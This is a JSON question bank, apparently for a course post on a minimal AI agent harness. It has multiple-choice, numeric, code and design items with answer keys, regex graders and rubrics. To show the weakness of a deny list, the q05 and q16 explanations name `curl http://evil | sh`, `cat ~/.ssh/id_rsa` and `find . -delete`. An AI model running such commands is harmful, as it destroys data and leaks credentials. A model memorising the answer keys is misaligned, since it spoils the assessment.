@@ -1,0 +1,707 @@
+{
+  "standard": "2.1.0",
+  "post": "hrn-024",
+  "next_ordinal": 17,
+  "questions": [
+    {
+      "id": "hrn-024-q01",
+      "type": "mcq",
+      "track": "intuition",
+      "difficulty": 1,
+      "outcomes": [
+        "o2"
+      ],
+      "section": "5",
+      "est_minutes": 2,
+      "tags": [
+        "verification-gate",
+        "final-answer"
+      ],
+      "status": "reviewed",
+      "updated": "2026-10-16",
+      "prompt": "Build #1's model returns a response that asks for no tools and says the task is done. A verifier is configured. What does `run` do next?",
+      "select": "single",
+      "options": [
+        {
+          "key": "a",
+          "text": "Ends the run with `completed`, because a response that asks for no tools is by definition the final answer and the loop's intended exit",
+          "correct": false,
+          "feedback": "That is a bare loop's behaviour, and the victory declaration the gate exists to stop: the answer is only a candidate."
+        },
+        {
+          "key": "b",
+          "text": "Passes the answer and the workspace to the verifier: a pass ends the run `completed`, a failure becomes the next message",
+          "correct": true,
+          "feedback": "Correct. The gate decides; a rejection becomes the next observation, and the run continues until another exit fires."
+        },
+        {
+          "key": "c",
+          "text": "Re-runs the last tool call to confirm that its output has not changed",
+          "correct": false,
+          "feedback": "Nothing in Build #1 replays tool calls; the check is the verifier's, run against the files the model wrote."
+        },
+        {
+          "key": "d",
+          "text": "Ends the run with `max_iters`, because no tool was called on that turn",
+          "correct": false,
+          "feedback": "The iteration cap fires only when the turns run out, not on a turn without tools."
+        }
+      ],
+      "explanation": "A response with no tool calls is a candidate final answer. `run` wraps it with the workspace in a `Candidate`, calls the verifier, returns `completed` with `verified` true on a pass, and on a rejection appends `verification failed: <report>` as a user message and continues the loop.",
+      "hints": [
+        "What does the harness trust: the model's claim, or something it can check?"
+      ]
+    },
+    {
+      "id": "hrn-024-q02",
+      "type": "mcq",
+      "track": "workout",
+      "difficulty": 2,
+      "outcomes": [
+        "o3"
+      ],
+      "section": "6",
+      "est_minutes": 3,
+      "tags": [
+        "budget",
+        "check-order"
+      ],
+      "status": "reviewed",
+      "updated": "2026-10-16",
+      "prompt": "Build #1 runs with `token_budget=2000` and a gate that accepts the work. The model's first call is a tool call costing 1,500 tokens; its second is a final answer costing 1,000 tokens, which passes the gate. How does the run end?",
+      "select": "single",
+      "options": [
+        {
+          "key": "a",
+          "text": "`budget`, because the second call takes the run to 2,500 tokens",
+          "correct": false,
+          "feedback": "The final-answer branch comes before any budget check on that turn, and a passing answer returns at once."
+        },
+        {
+          "key": "b",
+          "text": "`completed` at iteration 2 with 2,500 tokens used",
+          "correct": true,
+          "feedback": "Correct. A final answer that passes the gate returns `completed` whatever it cost; the budget checks sit on the rejection path and the tool-call path."
+        },
+        {
+          "key": "c",
+          "text": "`budget` at iteration 1, because 1,500 tokens is already most of the ceiling",
+          "correct": false,
+          "feedback": "The check fires only when `tokens_used` has reached the budget; 1,500 is below 2,000, so the tools run."
+        },
+        {
+          "key": "d",
+          "text": "`max_iters`, because the budget blocks the final answer from being accepted",
+          "correct": false,
+          "feedback": "Nothing blocks the answer: the gate passes it and the run returns before the cap matters."
+        }
+      ],
+      "explanation": "In `run` the gate comes first on every turn. A passing final answer returns `completed` with no budget check, so this run ends at iteration 2 with 2,500 tokens. `snippets/budget_order.py` prints exactly this case: verified work already paid for is not discarded to enforce a ceiling already crossed.",
+      "hints": [
+        "Which check does a turn with a final answer meet first?",
+        "Does a passing answer ever reach a budget check?"
+      ]
+    },
+    {
+      "id": "hrn-024-q03",
+      "type": "mcq",
+      "track": "edge",
+      "difficulty": 3,
+      "outcomes": [
+        "o3"
+      ],
+      "section": "6",
+      "est_minutes": 3,
+      "tags": [
+        "no-progress",
+        "stall-signal"
+      ],
+      "status": "reviewed",
+      "updated": "2026-10-16",
+      "prompt": "An agent on Build #1 polls a build with the same `ci status` call each turn. The output changes from `build queued` to `build running`, but the run stops with `no_progress` at iteration 3. Why?",
+      "select": "single",
+      "options": [
+        {
+          "key": "a",
+          "text": "The detector compares tool-call signatures, the name and arguments of each request, and never the results",
+          "correct": true,
+          "feedback": "Correct. Three identical requests fill the window whatever they returned, so a legitimate poll reads as thrashing."
+        },
+        {
+          "key": "b",
+          "text": "The output changed too slowly for the detector's three-turn window",
+          "correct": false,
+          "feedback": "The detector never looks at the output at all, so the speed of change is irrelevant."
+        },
+        {
+          "key": "c",
+          "text": "The budget ran out on the third call, and Build #1 reports a budget exit under the `no_progress` stop reason",
+          "correct": false,
+          "feedback": "A budget exit is reported as `budget`; the two exits are distinct `StopReason` values."
+        },
+        {
+          "key": "d",
+          "text": "The gate rejected the polling because it produced no file",
+          "correct": false,
+          "feedback": "The gate runs only on a final answer; these turns were tool calls."
+        }
+      ],
+      "explanation": "`_signature` fingerprints a turn's tool calls with `json.dumps` of each name and input. Three identical `ci status` requests produce three identical signatures, so the window of three fires `no_progress` before the run can see the build pass. It is the cheapest of the three stall signals, and its false positive.",
+      "hints": [
+        "What does `_signature` serialise?",
+        "Does the loop ever compare one observation with another?"
+      ]
+    },
+    {
+      "id": "hrn-024-q04",
+      "type": "mcq",
+      "track": "edge",
+      "difficulty": 3,
+      "outcomes": [
+        "o4"
+      ],
+      "section": "8",
+      "est_minutes": 3,
+      "tags": [
+        "offline-tests",
+        "coverage"
+      ],
+      "status": "reviewed",
+      "updated": "2026-10-16",
+      "prompt": "A change to `AnthropicModel` makes it drop the `tool_use_id` from every tool result it forwards, so the live API would reject the second request of any run that calls a tool. Which of Build #1's ten tests fails?",
+      "select": "single",
+      "options": [
+        {
+          "key": "a",
+          "text": "`test_gate_rejects_then_accepts_after_feedback`, because the report would go to the wrong call",
+          "correct": false,
+          "feedback": "That test drives a `ScriptedModel`, which ignores the messages it is given; `AnthropicModel` never runs in it."
+        },
+        {
+          "key": "b",
+          "text": "`test_schema_rejects_malformed_tool_call`, because the result would be malformed",
+          "correct": false,
+          "feedback": "That test checks the registry's input validation; it never constructs a provider request."
+        },
+        {
+          "key": "c",
+          "text": "None of them: every test injects a scripted model, so the live adapter has no coverage",
+          "correct": true,
+          "feedback": "Correct. The seam that makes the suite fast is also the seam hiding the code behind it."
+        },
+        {
+          "key": "d",
+          "text": "`test_no_progress_detection`, because the signatures would change",
+          "correct": false,
+          "feedback": "Signatures are built from the tool name and input, not from result identifiers, and that test uses a scripted model too."
+        }
+      ],
+      "explanation": "Every test passes a `ScriptedModel` and an injected runner. `AnthropicModel` and `subprocess_runner` are never executed, and `ScriptedModel` ignores the transcript, so a transcript the provider would reject passes all ten tests.",
+      "hints": [
+        "Which model does each test construct?",
+        "Does the scripted model read the messages it is sent?"
+      ]
+    },
+    {
+      "id": "hrn-024-q05",
+      "type": "mcq",
+      "track": "edge",
+      "difficulty": 2,
+      "outcomes": [
+        "o5"
+      ],
+      "section": "10",
+      "est_minutes": 2,
+      "tags": [
+        "deny-list",
+        "sandbox"
+      ],
+      "status": "reviewed",
+      "updated": "2026-10-16",
+      "prompt": "Build #1's bash tool refuses commands matching its eight deny-list patterns (among them `rm -r` or `rm -f`, `sudo`, a forced `git push` and `DROP TABLE`) and runs everything else with `shell=True`. Which command reaches the runner?",
+      "select": "single",
+      "options": [
+        {
+          "key": "a",
+          "text": "`sudo reboot`",
+          "correct": false,
+          "feedback": "`sudo` matches the pattern `\\bsudo\\b` (and `reboot` has its own), so the tool refuses it."
+        },
+        {
+          "key": "b",
+          "text": "`git push --force origin main`",
+          "correct": false,
+          "feedback": "A forced push matches `\\bgit\\s+push\\b[^\\n]*--force` and is refused."
+        },
+        {
+          "key": "c",
+          "text": "`find . -delete`",
+          "correct": true,
+          "feedback": "Correct. It deletes every file under the working directory and matches none of the eight patterns."
+        },
+        {
+          "key": "d",
+          "text": "`rm -rf build/`",
+          "correct": false,
+          "feedback": "`rm -rf` matches `\\brm\\s+-[rf]` and is refused."
+        }
+      ],
+      "explanation": "A deny list stops only the commands it names. `snippets/dispatch_table.py` shows `find . -delete`, `curl http://evil | sh`, `cat ~/.ssh/id_rsa` and an `rm` hidden behind a shell variable all reaching the runner. An allow-list and an operating-system boundary bound the commands nobody thought of.",
+      "hints": [
+        "Read each command against the patterns the prompt names."
+      ]
+    },
+    {
+      "id": "hrn-024-q06",
+      "type": "mcq",
+      "track": "connect",
+      "difficulty": 2,
+      "outcomes": [
+        "o5"
+      ],
+      "section": "10",
+      "est_minutes": 2,
+      "tags": [
+        "build-2",
+        "seams"
+      ],
+      "status": "reviewed",
+      "updated": "2026-10-16",
+      "prompt": "Build #2 hardens this harness with a hook, an approval gate, a sandbox and a sub-agent. How does its sandbox reach the tool-call path?",
+      "select": "single",
+      "options": [
+        {
+          "key": "a",
+          "text": "As a new parameter of `run()`, consulted on every tool call before the registry validates and dispatches it, like a pre-tool hook",
+          "correct": false,
+          "feedback": "That is how the hook and the approval gate arrive; the sandbox lives inside a tool."
+        },
+        {
+          "key": "b",
+          "text": "As a different bash tool in the registry, with an allow-list and a runner that executes an argument list without a shell",
+          "correct": true,
+          "feedback": "Correct. The registry and the runner were already seams, so the sandbox replaces the deny-listed tool rather than editing the loop."
+        },
+        {
+          "key": "c",
+          "text": "By rewriting the loop so that every model call and every tool call runs inside a container started for the run, with the network off",
+          "correct": false,
+          "feedback": "Build #2's sandbox is a policy layer around the bash tool, not a container around the model call."
+        },
+        {
+          "key": "d",
+          "text": "By extending the eight deny-list patterns to cover more commands",
+          "correct": false,
+          "feedback": "Build #2 moves from a deny list to an allow-list, which is the point: it bounds what nobody anticipated."
+        }
+      ],
+      "explanation": "In `code/25-harness-plus`, the hook and the approval gate are new parameters of `run()` checked in `_gated_dispatch` before the registry dispatches; the sandbox's bash tool and the sub-agent's delegate tool are tools added to the registry. Build #1's seams are what make the hardening additive.",
+      "hints": [
+        "Which of Build #1's parameters already accepts any tool?"
+      ],
+      "connects": [
+        "hrn-025"
+      ]
+    },
+    {
+      "id": "hrn-024-q07",
+      "type": "short",
+      "track": "intuition",
+      "difficulty": 2,
+      "outcomes": [
+        "o2",
+        "o3"
+      ],
+      "section": "6",
+      "est_minutes": 3,
+      "tags": [
+        "no-progress",
+        "verification-gate"
+      ],
+      "status": "reviewed",
+      "updated": "2026-10-16",
+      "prompt": "Right after it feeds a rejection back to the model, Build #1's gate block calls `recent.clear()`, emptying the window of recent tool-call signatures. What would go wrong without that line?",
+      "answer": {
+        "model": "A corrected re-submission would look like a repeat to the no-progress detector, so a run that is fixing its work would be stopped with `no_progress` for making progress.",
+        "accept": [
+          "^(?=(?:\\S+\\s+){5})(?![\\s\\S]*\\b(maybe|perhaps|probably|possibly|not sure|i think|i guess|might be)\\b)(?![\\s\\S]*\\b(nothing|no difference|no effect)\\b)(?![\\s\\S]*\\b(never|not|n't|wouldn't|would not|could not|cannot)\\s+(be\\s+)?(stop|stopp|kill|end|terminat|halt|abort|exit|fire|trip|trigger)\\w*)(?![\\s\\S]*\\bbudget\\b)(?![\\s\\S]*\\b(by|at|via|with|hit\\w*|reach\\w*|until)\\s+(the\\s+)?(max[ _-]?iter\\w*|iteration cap)\\b)(?![\\s\\S]*\\b(which is|that is|this is) (an? )?(improvement|good|fine|better|desired|correct)\\b)(?![\\s\\S]*\\b(correctly|rightly) (stop|kill|end|catch)\\w*)(?=[\\s\\S]*\\b((kill|stop|end|terminat|abort|halt|cut off|shut down)\\w*\\s+(?:[\\w'-]+[,;:]?\\s+){0,6}(that|which|while|when|though|even though|despite|for|whilst|although)\\s+(?:[\\w'-]+[,;:]?\\s+){0,4}(is |are |was |were )?(still )?(making progress|progress\\w*|fix\\w*|correct\\w*|recover\\w*|improv\\w*|working|retr\\w*)|(correct\\w*|fix\\w*|retr\\w*|re-?submi\\w*|re-?run\\w*|recover\\w*|legitimate|progress\\w*)\\s+(?:[\\w'-]+[,;:]?\\s+){0,8}(look\\w*|seen|seem\\w*|read\\w*|count\\w*|treat\\w*|mistak\\w*|taken|misread\\w*|flag\\w*|interpret\\w*|register\\w*|appear\\w*|classif\\w*)\\s+(?:[\\w'-]+[,;:]?\\s+){0,4}(as|like|for)\\s+(?:[\\w'-]+[,;:]?\\s+){0,3}(an?\\s+)?(repeat\\w*|repetition|stall\\w*|thrash\\w*|no[ _-]?progress|doom loop|identical|loop\\w*|stuck)|(detector|no[ _-]?progress|stall check|check|window)\\s+(?:[\\w'-]+[,;:]?\\s+){0,6}(fire|trip|trigger|stop|kill|end)\\w*\\s+(?:[\\w'-]+[,;:]?\\s+){0,6}(on|during|against|for|in)\\s+(?:[\\w'-]+[,;:]?\\s+){0,6}(correct\\w*|fix\\w*|retr\\w*|re-?submi\\w*|re-?run\\w*|recover\\w*|legitimate|progress\\w*)|(correct\\w*|fix\\w*|retr\\w*|re-?submi\\w*|re-?run\\w*|recover\\w*|legitimate|progress\\w*)\\s+(?:[\\w'-]+[,;:]?\\s+){0,4}(would|will|gets?|is|are|could)\\s+(be\\s+|get\\s+)?(kill|stop|end|terminat|abort|halt|cut off|shut down)\\w*|(repeat\\w*|identical|same)\\s+(?:[\\w'-]+[,;:]?\\s+){0,6}(after|following)\\s+(an?\\s+|the\\s+)?(fix|correction|rejection|retry)\\w*\\s+(?:[\\w'-]+[,;:]?\\s+){0,3}(would\\s+|will\\s+|could\\s+)?(trip|trigger|fire|stop|kill|end)\\w*)\\b)[\\s\\S]*\\S"
+        ]
+      },
+      "explanation": "After a rejection the agent often re-runs the same check or rewrites the same file, so its tool calls repeat. Clearing the window treats the rejection as progress; without it the stall detector and the retry loop fight, and the bug lives in the join between two features that are each correct alone.",
+      "hints": [
+        "What does the no-progress detector compare across turns?",
+        "What does an agent typically do after its answer is rejected?"
+      ]
+    },
+    {
+      "id": "hrn-024-q08",
+      "type": "short",
+      "track": "edge",
+      "difficulty": 3,
+      "outcomes": [
+        "o4"
+      ],
+      "section": "8",
+      "est_minutes": 4,
+      "tags": [
+        "verified-flag",
+        "status-flags"
+      ],
+      "status": "reviewed",
+      "updated": "2026-10-16",
+      "prompt": "One of Build #1's tests runs the harness with no verifier and asserts `res.verified is True`. What is wrong with the result that test pins, and what change to the field would fix it?",
+      "answer": {
+        "model": "No gate ran, so nothing checked the work, yet `verified` reports true. Make the field three-valued: true on a pass, false on a rejection, `None` when no gate ran.",
+        "accept": [
+          "^(?=(?:\\S+\\s+){4})(?![\\s\\S]*\\b(maybe|perhaps|probably|possibly|not sure|i think|i guess|might be)\\b)(?![\\s\\S]*\\b(it is fine|it's fine|not a problem|no problem|correct as is|overkill|pointless|unnecessary)\\b)(?![\\s\\S]*\\btrue is (right|correct|fine|honest|accurate)\\b)(?![\\s\\S]*\\b(rather than|instead of|not)\\s+(a\\s+)?(three|tri|none|null|third|optional|unknown)\\b)(?![\\s\\S]*\\b(should|must|to|be|make|set|return|default)\\w*\\s+(it\\s+|verified\\s+|the field\\s+)?(be\\s+)?(set\\s+)?(to\\s+)?false\\b(?!\\s*(on|for|when|after|if)\\b))(?=[\\s\\S]*\\b(no (gate|verifier|check)|nothing (was |is |ever )?(checked|verified|ran|run)|unchecked|unverified|without (a |any )?(gate|verifier|check)|never (checked|verified)|not (actually )?(checked|verified)|verify\\s*=\\s*none|no verification)\\b)(?=[\\s\\S]*\\b(three|tri-?state|tri-?valued|none|null|unknown|not checked|unchecked|third (value|state)|optional)\\b)[\\s\\S]*\\S"
+        ]
+      },
+      "explanation": "`run` computes `verify(candidate) if verify else VerifyResult(True)`, so a run with no gate reports verified work. The state the field exists to expose, finished but unchecked, is the one it cannot express. Setting it to false instead would confuse an unchecked run with a rejected one; a third value is the honest shape.",
+      "hints": [
+        "What checked the answer in that run?",
+        "False already means something: what is the third case?"
+      ]
+    },
+    {
+      "id": "hrn-024-q09",
+      "type": "numeric",
+      "track": "workout",
+      "difficulty": 2,
+      "outcomes": [
+        "o3"
+      ],
+      "section": "6",
+      "est_minutes": 3,
+      "tags": [
+        "budget",
+        "overrun"
+      ],
+      "status": "reviewed",
+      "updated": "2026-10-16",
+      "prompt": "Build #1 runs with an always-rejecting gate, `token_budget=2000` and `max_iters=40`. Every model call is a final answer costing 700 tokens. How many tokens has the run spent when it stops?",
+      "answer": {
+        "value": 2100,
+        "tolerance": 0.5,
+        "unit": "tokens"
+      },
+      "precision_note": "The check runs after each call is counted: 700, 1,400, then 2,100 at iteration 3, which reaches 2,000 and fires the budget exit. 2,000 (the ceiling) and 2,800 (one call more) are wrong methods.",
+      "explanation": "Each rejected answer is a spent call; the budget check on the gate-rejection path sees 700 and 1,400 below the ceiling, and 2,100 at or above it. The run stops after the call that crossed the line, so the overrun is at most one call: 100 tokens here.",
+      "hints": [
+        "Add 700 per call and compare after each addition.",
+        "The call that crosses the ceiling has already been paid for."
+      ]
+    },
+    {
+      "id": "hrn-024-q10",
+      "type": "numeric",
+      "track": "workout",
+      "difficulty": 3,
+      "outcomes": [
+        "o3"
+      ],
+      "section": "6",
+      "est_minutes": 4,
+      "tags": [
+        "budget",
+        "overrun"
+      ],
+      "status": "reviewed",
+      "updated": "2026-10-16",
+      "prompt": "Build #1 runs with `token_budget=4000` and an always-rejecting gate. Each final answer costs 1,500 tokens. By what percentage of the ceiling does the spend at the budget exit exceed the ceiling?",
+      "answer": {
+        "value": 12.5,
+        "tolerance": 0.05,
+        "unit": "percent"
+      },
+      "precision_note": "1,500, 3,000, 4,500: the exit fires at iteration 3 with 4,500 spent; (4,500 - 4,000) / 4,000 = 12.5%. The share of one call (37.5%) and 4,500 / 4,000 = 112.5% are the near misses.",
+      "explanation": "The check runs after the call is counted, so the spend at the exit is the first running total at or above 4,000, which is 4,500. The overrun is 500 tokens, 12.5% of the ceiling; it is bounded by one call, not by a percentage.",
+      "hints": [
+        "List the running totals until one reaches 4,000.",
+        "Divide the excess by the ceiling, not by the spend."
+      ]
+    },
+    {
+      "id": "hrn-024-q11",
+      "type": "numeric",
+      "track": "run",
+      "difficulty": 2,
+      "outcomes": [
+        "o2"
+      ],
+      "section": "7",
+      "est_minutes": 3,
+      "tags": [
+        "demo",
+        "verification-gate"
+      ],
+      "status": "reviewed",
+      "updated": "2026-10-16",
+      "prompt": "The companion's demo scripts four responses: a tool call writing a buggy file (20 tokens), a final answer (8), a tool call writing the fix (18), and a final answer (8). With the palindrome gate the run uses 54 tokens. How many tokens does the same script use when `run` is called with `verify=None`?",
+      "answer": {
+        "value": 28,
+        "tolerance": 0,
+        "unit": "tokens"
+      },
+      "precision_note": "With no gate the first final answer completes the run at iteration 2: 20 + 8 = 28, as snippets/task_run.py prints. 54 (all four calls) and 20 (the first call only) are the wrong methods.",
+      "explanation": "With `verify=None` the gate is `VerifyResult(True)`, so the first final answer ends the run as `completed` after the buggy write. The run is 26 tokens cheaper and ships `return s == s`.",
+      "hints": [
+        "Which response is the first final answer?",
+        "Without a gate, does anything reject it?"
+      ]
+    },
+    {
+      "id": "hrn-024-q12",
+      "type": "code",
+      "track": "run",
+      "difficulty": 3,
+      "outcomes": [
+        "o3"
+      ],
+      "section": "6",
+      "est_minutes": 12,
+      "tags": [
+        "budget",
+        "check-order"
+      ],
+      "status": "reviewed",
+      "updated": "2026-10-16",
+      "prompt": "`run_loop` is a cut-down model of Build #1's loop: each turn is a model call that is either a final answer judged by `verify` or a tool call. As written, a model that keeps declaring done and keeps failing the gate never meets the budget, so the run spends to `max_iters`. Fix it so the budget fires on every path that spends a call without completing, while a final answer that passes the gate still completes whatever it cost.",
+      "kind": "fix",
+      "language": "python",
+      "starter": "def run_loop(turns, verify, token_budget=None, max_iters=12):\n    \"\"\"turns: one dict per model call, in order, {\"final\": bool, \"tokens\": int}.\n    verify(step) -> bool judges the final answer given on call `step` (counted from 1).\n    Return (stop_reason, iterations, tokens_used), stop_reason one of\n    \"completed\", \"budget\", \"max_iters\". A final answer that passes the gate completes\n    the run whatever it cost; every other spent call is checked against token_budget\n    after it is counted.\"\"\"\n    tokens_used = 0\n    for step in range(1, max_iters + 1):\n        turn = turns[step - 1]\n        tokens_used += turn[\"tokens\"]\n        if turn[\"final\"]:\n            if verify(step):\n                return \"completed\", step, tokens_used\n            continue\n        if token_budget is not None and tokens_used >= token_budget:\n            return \"budget\", step, tokens_used\n    return \"max_iters\", max_iters, tokens_used\n",
+      "solution": "def run_loop(turns, verify, token_budget=None, max_iters=12):\n    \"\"\"turns: one dict per model call, in order, {\"final\": bool, \"tokens\": int}.\n    verify(step) -> bool judges the final answer given on call `step` (counted from 1).\n    Return (stop_reason, iterations, tokens_used), stop_reason one of\n    \"completed\", \"budget\", \"max_iters\". A final answer that passes the gate completes\n    the run whatever it cost; every other spent call is checked against token_budget\n    after it is counted.\"\"\"\n    tokens_used = 0\n    for step in range(1, max_iters + 1):\n        turn = turns[step - 1]\n        tokens_used += turn[\"tokens\"]\n        if turn[\"final\"]:\n            if verify(step):\n                return \"completed\", step, tokens_used\n            if token_budget is not None and tokens_used >= token_budget:\n                return \"budget\", step, tokens_used\n            continue\n        if token_budget is not None and tokens_used >= token_budget:\n            return \"budget\", step, tokens_used\n    return \"max_iters\", max_iters, tokens_used\n",
+      "tests": "reject = lambda step: False\naccept = lambda step: True\nfinals = [{\"final\": True, \"tokens\": 1000}] * 100\n\n# the gate keeps rejecting: the budget must still fire, at most one call over\nassert run_loop(finals, reject, token_budget=2000, max_iters=40) == (\"budget\", 2, 2000)\nassert run_loop([{\"final\": True, \"tokens\": 600}] * 100, reject, token_budget=2000,\n                max_iters=40) == (\"budget\", 4, 2400)\n\n# the tool-call path keeps its check\ntools = [{\"final\": False, \"tokens\": 50}] * 100\nassert run_loop(tools, accept, token_budget=120, max_iters=100) == (\"budget\", 3, 150)\n\n# a final answer that passes the gate completes, even over the ceiling\nover = [{\"final\": False, \"tokens\": 1500}, {\"final\": True, \"tokens\": 1000}]\nassert run_loop(over, accept, token_budget=2000) == (\"completed\", 2, 2500)\n\n# no budget: the cap is the backstop\nassert run_loop(finals, reject, max_iters=6) == (\"max_iters\", 6, 6000)\n\n# alternating calls: a rejection that crosses the ceiling stops the run there\nmixed = [{\"final\": False, \"tokens\": 300}, {\"final\": True, \"tokens\": 300}] * 50\nassert run_loop(mixed, reject, token_budget=1000, max_iters=40) == (\"budget\", 4, 1200)\nassert run_loop(mixed, lambda step: step == 6, token_budget=5000) == (\"completed\", 6, 1800)\nprint(\"all tests passed\")\n",
+      "expected_output": "all tests passed\n",
+      "explanation": "A rejected final answer is a spent call like any other, so the budget check belongs on the rejection path as well as the tool-call path, after the call is counted. A check placed before the gate would discard verified work already paid for; a strict `>` would let a run sit exactly at the ceiling and spend one call more.",
+      "hints": [
+        "Trace the starter with every turn a rejected final answer: which check does it ever reach?",
+        "Put the same check on the rejection path, after the gate has said no and before the loop continues."
+      ]
+    },
+    {
+      "id": "hrn-024-q13",
+      "type": "order",
+      "track": "intuition",
+      "difficulty": 1,
+      "outcomes": [
+        "o1"
+      ],
+      "section": "6",
+      "est_minutes": 2,
+      "tags": [
+        "loop",
+        "check-order"
+      ],
+      "status": "reviewed",
+      "updated": "2026-10-16",
+      "prompt": "Put the steps of one turn of Build #1's `run` in the order the code performs them, for a turn on which the model asks for a tool.",
+      "items": [
+        {
+          "key": "a",
+          "text": "Run the tool calls through the registry and append the results"
+        },
+        {
+          "key": "b",
+          "text": "Call the model and add its tokens to `tokens_used`"
+        },
+        {
+          "key": "c",
+          "text": "Check whether the turn is a final answer for the gate"
+        },
+        {
+          "key": "d",
+          "text": "Check the token budget"
+        },
+        {
+          "key": "e",
+          "text": "Record the turn's signature and check for no progress"
+        }
+      ],
+      "answer": [
+        "b",
+        "c",
+        "d",
+        "e",
+        "a"
+      ],
+      "partial_credit": true,
+      "explanation": "`run` calls the model and counts its tokens, tests `is_final()` (false on a tool turn), checks the budget, appends the signature and checks the no-progress window, and only then dispatches the tools. `snippets/budget_order.py` prints the line of `harness.py` where each step sits.",
+      "hints": [
+        "Nothing can be checked before the model has answered.",
+        "The tools run last, after every exit that could stop the turn."
+      ]
+    },
+    {
+      "id": "hrn-024-q14",
+      "type": "match",
+      "track": "connect",
+      "difficulty": 2,
+      "outcomes": [
+        "o1"
+      ],
+      "section": "2",
+      "est_minutes": 3,
+      "tags": [
+        "layout",
+        "primitives"
+      ],
+      "status": "reviewed",
+      "updated": "2026-10-16",
+      "prompt": "Match each module of Build #1's engine to the primitive it implements. One primitive on the right is not in Build #1.",
+      "left": [
+        {
+          "key": "a",
+          "text": "`harness.py`"
+        },
+        {
+          "key": "b",
+          "text": "`tools.py`"
+        },
+        {
+          "key": "c",
+          "text": "`verify.py`"
+        },
+        {
+          "key": "d",
+          "text": "`models.py`"
+        }
+      ],
+      "right": [
+        {
+          "key": "a",
+          "text": "The loop and its four exits"
+        },
+        {
+          "key": "b",
+          "text": "A schema-validated registry and a deny-listed bash tool"
+        },
+        {
+          "key": "c",
+          "text": "A verification gate from candidate to verdict"
+        },
+        {
+          "key": "d",
+          "text": "The model seam: a normalised response, a scripted double, a live adapter"
+        },
+        {
+          "key": "e",
+          "text": "A tracer that records a span per call"
+        }
+      ],
+      "answer": {
+        "a": "a",
+        "b": "b",
+        "c": "c",
+        "d": "d"
+      },
+      "explanation": "Each engine module is one primitive from an earlier post: `harness.py` the loop of post 03 with the exits of posts 03 and 19, `tools.py` the registry of post 06, `verify.py` the gate of post 11, `models.py` the model seam. Tracing is Build #2's addition from post 21.",
+      "hints": [
+        "The exits live where the loop lives.",
+        "Which post adds observability to the builds?"
+      ],
+      "connects": [
+        "hrn-003",
+        "hrn-006",
+        "hrn-011",
+        "hrn-025"
+      ]
+    },
+    {
+      "id": "hrn-024-q15",
+      "type": "long",
+      "track": "workout",
+      "difficulty": 3,
+      "outcomes": [
+        "o1",
+        "o4"
+      ],
+      "section": "8",
+      "est_minutes": 20,
+      "tags": [
+        "offline-tests",
+        "exits"
+      ],
+      "status": "reviewed",
+      "updated": "2026-10-16",
+      "prompt": "Write the offline test plan for a minimal harness with a loop, a schema-validated registry, a verification gate and four layered exits. For each exit say how a scripted model provokes it and what the test asserts; name two tests beyond the exits; and list what such a suite cannot see, with one way to cover each gap.",
+      "kind": "design",
+      "explanation": "A harness test provokes one behaviour with a scripted model and asserts on the stop reason. The exits are the safety surface, so each gets its own test, the budget on both paths that spend a call; the plan is only honest if it also names what the doubles hide, because ten green tests otherwise read as covering far more than they do.",
+      "solution": "1. **Exit (1), completed.** Script a tool call that writes a correct file, then a final answer; assert `completed`, `verified` true and the iteration count. Add the rejection case: a wrong file, a final answer, the fix, a final answer; assert `completed` and that the report was injected into the transcript.\n2. **Exit (2), iteration cap.** Script a model that always writes the wrong file and declares done; assert `max_iters` and `verified` false at the cap.\n3. **Exit (3), budget.** Two tests: tool calls with fixed token counts and a small budget; and an always-rejecting gate with final answers only, asserting `budget` with at most one call of overrun, since a check on one path is not a ceiling.\n4. **Exit (4), no progress.** Script the identical tool call repeatedly; assert `no_progress` at the third repeat. Add a correction case: the same check re-run after each rejection must not trip it.\n5. **Beyond the exits.** The deny list refuses a named destructive command and passes a safe one; a malformed call (a missing and an invented argument) returns an observation before the runner is touched.\n6. **What the suite cannot see.** The live adapter and the real runner (cover with a small, marked, opt-in live test or a recorded-request test); the transcript's validity, since the scripted model ignores it (assert on the request the adapter would send); truncated live answers (a test with a response stopped at its token limit); commands not on the deny list (an adversarial table of payloads); and a `verified` field that reports true with no gate (a three-valued field and a test for `None`).",
+      "rubric": [
+        {
+          "criterion": "Provokes each of the four exits with a scripted model and asserts on the stop reason, not the output",
+          "points": 4
+        },
+        {
+          "criterion": "Tests the budget on the gate-rejection path as well as the tool-call path",
+          "points": 2
+        },
+        {
+          "criterion": "Includes the reset case for the no-progress detector after a rejection",
+          "points": 1
+        },
+        {
+          "criterion": "Names at least two tests beyond the exits, such as the deny list and schema validation",
+          "points": 1
+        },
+        {
+          "criterion": "Lists at least three gaps of an offline suite, each with a way to cover it",
+          "points": 3
+        }
+      ],
+      "hints": [
+        "One test per exit, each provoking exactly one behaviour.",
+        "Ask of each seam what the double hides."
+      ]
+    },
+    {
+      "id": "hrn-024-q16",
+      "type": "long",
+      "track": "connect",
+      "difficulty": 4,
+      "outcomes": [
+        "o5"
+      ],
+      "section": "9",
+      "est_minutes": 25,
+      "tags": [
+        "going-live",
+        "seams",
+        "blast-radius"
+      ],
+      "status": "reviewed",
+      "updated": "2026-10-16",
+      "prompt": "A team wants to point Build #1 at its own repository: a live model, real shell commands, and its existing test suite as the gate. Plan the move: which seams change and how, what each change does to the risk, which of Build #1's own defaults bite once it is live, and what must be added before the agent runs unattended.",
+      "kind": "design",
+      "explanation": "Every seam that made the suite fast and offline widens the blast radius when it goes live, and the shell runner most of all. Build #1's own defaults (truncation treated as a final answer, an in-memory workspace, a verified flag that defaults to true) bite only live, which is why the offline suite never showed them; Build #2's layers are what make an unattended run acceptable.",
+      "solution": "1. **Model.** Swap `ScriptedModel` for `AnthropicModel` with the `anthropic` extra and a key; the run becomes non-deterministic and metered, so set `token_budget` from a priced estimate. Check the default model identifier and `max_tokens` of 1,024: a truncated response has no tool call, so `is_final()` treats it as a final answer; read the provider's stop reason instead.\n2. **Workspace.** Build #1 ships only the in-memory dictionary. Write a filesystem-backed workspace and point both `write_file` and the verifier at it, or a shelled-out test suite will test files that were never written to disk; add checkpoints so a bad step can be undone (post 08).\n3. **Verifier.** Replace `python_function_tests` with a shell-out to the project's suite with its own timeout; it costs seconds per gate call, and the in-process `exec` it replaces should not survive near untrusted code.\n4. **Runner.** `subprocess_runner` runs the model's string with `shell=True` behind eight deny-list patterns, which `find . -delete` or `curl ... | sh` pass. This is the largest widening of the blast radius.\n5. **Before unattended runs.** Add Build #2's layers: a pre-tool hook for deterministic blocks, an allow-list sandbox with an argv runner and a working-directory jail (Build #2's checks path tokens, so back it with an operating-system boundary, post 14), an approval gate for irreversible actions, and tracing so each gate's decision is visible; fix the `verified` field so unchecked runs say so.",
